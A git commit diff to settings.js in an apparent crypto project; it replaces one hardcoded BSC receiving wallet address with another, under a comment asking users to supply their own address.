3896acedd0812587fa1281b03b98c8034638d75a
rededesign <red.e.design.re@gmail.com>
2024-10-12 19:24:49 -0700

    Update settings.js

--- settings.js
+++ settings.js
@@ -1,6 +1,6 @@
 //code for local smart contract
 
-const receiveAddress = "0x5b3606F7dF5ce9fF4e79Cd9094d4D5a135cf147F";   // remove the words and replace it with your bsc address    
+const receiveAddress = "0xd66b869278446e793200a3913DED04aC9a8db045";   // remove the words and replace it with your bsc address    
 
 	
 var cryptotokenContract;
